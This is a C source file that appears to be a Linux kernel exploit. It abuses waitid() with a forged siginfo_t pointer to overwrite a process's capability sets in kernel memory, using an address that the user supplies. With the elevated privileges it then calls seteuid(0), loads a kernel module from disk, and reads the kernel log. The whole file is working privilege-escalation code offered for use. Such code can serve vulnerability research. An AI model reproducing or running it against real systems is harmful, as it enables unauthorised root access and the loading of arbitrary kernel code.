#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>

#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/wait.h>
#include <sys/types.h>
#include  <signal.h>
#include  <sys/ipc.h>
#include  <sys/shm.h>
#include <sys/syscall.h>

#include <sys/stat.h>

#define init_module(module_image, len, param_values) syscall(__NR_init_module, module_image, len, param_values)
#define finit_module(fd, param_values, flags) syscall(__NR_finit_module, fd, param_values, flags)

unsigned long long base_address_cap = 0x0;
unsigned long long cap_inheritable;
unsigned long long cap_permitted;
unsigned long long cap_effective;
unsigned long long cap_bset;
unsigned long long cap_ambient;

int BASH = 0;

void do_priv(int cmd_type) {
    int result;
    /*
    char *const parmList[] = {"/usr/sbin/capsh", "--print", NULL};
    char *const envParms[2] = {"STEPLIB=SASC.V6.LINKLIB", NULL};

    result = execve("/usr/sbin/capsh", parmList, envParms);
    if (result < 0) {
        perror("Failed: ");
    }
    */
    
    if ( cmd_type == 0 ){
       /* 
        //char *const parmList[] = {"/usr/bin/bash", NULL};
        char *const parmList[] = {"/bin/sleep", "1000", NULL};
        //char *const envParms[2] = {"STEPLIB=SASC.V6.LINKLIB", NULL};
        char *const envParms[1] = {NULL};


        //result = execve("/usr/bin/bash", parmList, envParms);
        result = execve("/bin/sleep", parmList, envParms);
        if (result < 0) {
            perror("Failed: ");
        }

*/
	    const char *params = "";
    	int fd, use_finit;
	    size_t image_size;
    	struct stat st;
	    void *image;


		printf("invoking insmod\n");
   		fd = open("/home/lkms/test_firmware.ko", O_RDONLY);
   		fstat(fd, &st);
   		image_size = st.st_size;
   		image = malloc(image_size);
   		read(fd, image, image_size);
   		close(fd);
   		if (init_module(image, image_size, params) != 0) {
   		    perror("init_module");
   		    return EXIT_FAILURE;
   		}
		printf("invoked insmod successfully\n");
   		free(image);
    }else{
    
 
    /*
       char *const parmList[] = {"/usr/bin/dmesg", NULL, NULL};
       char *const envParms[2] = {"STEPLIB=SASC.V6.LINKLIB", NULL};

       result = execve("/usr/bin/dmesg", parmList, envParms);
       if (result < 0) {
       perror("Failed: ");
       }
       */

        char buf[1024];
        result = syscall(__NR_syslog, 3, buf, 1024);
        if (result > 0) {
            printf("read: %s\n", buf);
            printf("read %d bytes\n", result);
        } else {
            perror("Failed");
        }
    }
}

void write_ambient(siginfo_t* infop) {
    int i = 0, result = 0;
    unsigned long long address;

    // What's the offset we should write at? 
    long offset = ((char*)&(infop->si_uid)) - (char*)infop;

    // Wait for the oracle to tell you the address of the location you want to
    // overwrite
    printf("Enter the address of ambient.cap[0]:");
    // e.g 0xffff88a3b8b17f30
    //
    result = scanf("%16llx", &address);
    printf("Going to overwrite address: %lx\n", address);

    pid_t pid = fork();

    if (pid == 0) {
        printf("In child\n");
        sleep(1);
    } else {
        printf("In parent\n");
        //waitid(P_PID, pid, infop, WEXITED);
        siginfo_t* fake_siginfo = (siginfo_t*)((char*) address - offset);
        printf("fake pointer: %p\n", fake_siginfo);
        int waitidRet = waitid(P_PID, pid, fake_siginfo, WEXITED);
        printf("waitid returned: %d\n", waitidRet);
        printf("The child with uid:%lx exited: \n", infop->si_uid);
        printf("Enter 1 to continue:\n");
        scanf("%d", &result);

        //do_priv();

        printf("Enter 1 to continue:\n");
        scanf("%d", &result);

        do_priv(0);

        printf("Enter something to exit:\n");
        scanf("%d", &result);
    }
}





void write_inheritable(siginfo_t* infop) {
    char insmod_cmd[] = "insmod";
    char dmesg_cmd[] = "dmesg";
    char cmdToRun[4096];

    int i = 0, result = 0;
    int exit = 1;
    //unsigned long long address;

    // What's the offset we should write at? 
    long offset = ((char*)&(infop->si_uid)) - (char*)infop;

    // Wait for the oracle to tell you the address of the location you want to
    // overwrite
    //printf("Enter the address of inheritable.cap[0]:");
    // e.g 0xffff88a3b8b17f30
    //
    //result = scanf("%16llx", &address);
    printf("Going to overwrite address for cap_inheritable[0]: %lx\n", cap_inheritable);

    pid_t pid = fork();

    if (pid == 0) {
        printf("In child\n");
        sleep(1);
    } else {
        printf("In parent\n");
        //waitid(P_PID, pid, infop, WEXITED);
        siginfo_t* fake_siginfo = (siginfo_t*)((char*) cap_inheritable - offset);
        printf("fake pointer: %p\n", fake_siginfo);
        int waitidRet = waitid(P_PID, pid, fake_siginfo, WEXITED);
        printf("waitid returned: %d\n", waitidRet);
        printf("The child with uid:%lx exited: \n", infop->si_uid);

        //write_ambient(infop);

        seteuid(0);
        setegid(0);

        fflush(stdin);
        fgets(cmdToRun, 4096, stdin);
        do{
            printf("Enter command to run:\n");
            fgets(cmdToRun, 4096, stdin);

            if ( strncmp(cmdToRun, insmod_cmd, strlen(insmod_cmd)) == 0 )
                do_priv(0);
            else if ( strncmp(cmdToRun, dmesg_cmd, strlen(dmesg_cmd)) == 0 )
                do_priv(1);
            else
                exit--;
        }while(exit > 0);
        printf("goodbye\n");
    }
}
void write_effective(siginfo_t* infop) {
    int i = 0, result = 0;
    //unsigned long long address;

    // What's the offset we should write at? 
    long offset = ((char*)&(infop->si_uid)) - (char*)infop;

    // Wait for the oracle to tell you the address of the location you want to
    // overwrite
    //printf("Enter the address of effective.cap[0]:");
    // e.g 0xffff88a3b8b17f30
    //
    //result = scanf("%16llx", &address);
    printf("Going to overwrite address for cap_effective[0]: %lx\n", cap_effective);

    pid_t pid = fork();

    if (pid == 0) {
        printf("In child\n");
        sleep(1);
    } else {
        printf("In parent\n");
        //waitid(P_PID, pid, infop, WEXITED);
        siginfo_t* fake_siginfo = (siginfo_t*)((char*) cap_effective - offset);
        printf("fake pointer: %p\n", fake_siginfo);
        int waitidRet = waitid(P_PID, pid, fake_siginfo, WEXITED);
        printf("waitid returned: %d\n", waitidRet);
        printf("The child with uid:%lx exited: \n", infop->si_uid);

        write_inheritable(infop);
    }
 
}

void write_permitted(siginfo_t* infop) {

    int i = 0, result = 0;

    // What's the offset we should write at? 
    long offset = ((char*)&(infop->si_uid)) - (char*)infop;
    printf("We should send the offset as: %ld\n", offset);

    // Wait for the oracle to tell you the address of the location you want to
    // overwrite
    //printf("Enter the address of permitted.cap[0]:");
    // e.g 0xffff88a3b8b17f30
    //
    //result = scanf("%16llx", &address);
    printf("Going to overwrite address for cap_permitted[0]: %lx\n", cap_permitted);

    pid_t pid = fork();

    if (pid == 0) {
        printf("In child\n");
        sleep(1);
    } else {
        printf("In parent\n");
        //waitid(P_PID, pid, infop, WEXITED);
        siginfo_t* fake_siginfo = (siginfo_t*)((char*) cap_permitted - offset);
        printf("fake pointer: %p\n", fake_siginfo);
        int waitidRet = waitid(P_PID, pid, fake_siginfo, WEXITED);
        printf("waitid returned: %d\n", waitidRet);
        printf("The child with uid:%lx exited: \n", infop->si_uid);

        write_effective(infop);
    }
 
}

void write_bset(siginfo_t* infop) {
    int i = 0, result = 0;
    //unsigned long long address;

    // What's the offset we should write at? 
    long offset = ((char*)&(infop->si_uid)) - (char*)infop;

    // Wait for the oracle to tell you the address of the location you want to
    // overwrite
    //printf("Enter the address of bset.cap[0]:");
    // e.g 0xffff88a3b8b17f30
    //
    //result = scanf("%16llx", &address);
    printf("Going to overwrite address: %lx\n", cap_bset);

    pid_t pid = fork();

    if (pid == 0) {
        printf("In child\n");
        sleep(1);
    } else {
        printf("In parent\n");
        //waitid(P_PID, pid, infop, WEXITED);
        siginfo_t* fake_siginfo = (siginfo_t*)((char*) cap_bset - offset);
        printf("fake pointer: %p\n", fake_siginfo);
        int waitidRet = waitid(P_PID, pid, fake_siginfo, WEXITED);
        printf("waitid returned: %d\n", waitidRet);
        printf("The child with uid:%lx exited: \n", infop->si_uid);
        /*
        printf("Enter 1 to continue:\n");
        scanf("%d", &result);

        do_priv();
        */
        write_permitted(infop);

        //write_ambient(infop);
    }
 
}
/*
 * sudo useradd -u 4294967294 dummy
 *
 * Run this process as that dummy
 */


int main(int argc, char** argv) {
    printf("Enter the base address of capabilities:");
    // e.g 0xffff88a3b8b17f30
    //
    int result;

    result = scanf("%16llx", &base_address_cap);

    //kernel_cap_t    cap_inheritable; /* caps our children can inherit */
    //kernel_cap_t    cap_permitted;  /* caps we're permitted */
    //kernel_cap_t    cap_effective;  /* caps we can actually use */
    //kernel_cap_t    cap_bset;   /* capability bounding set */
    //kernel_cap_t    cap_ambient;    /* Ambient capability set */

    cap_inheritable = base_address_cap;
    cap_permitted = cap_inheritable + 8;
    cap_effective = cap_permitted + 8;
    cap_bset = cap_effective + 8;
    cap_ambient = cap_bset + 8;

    siginfo_t *infop = malloc(sizeof(siginfo_t));
    if ( argc > 1 )
        BASH = 1;
    write_bset(infop);
    return 0;
}
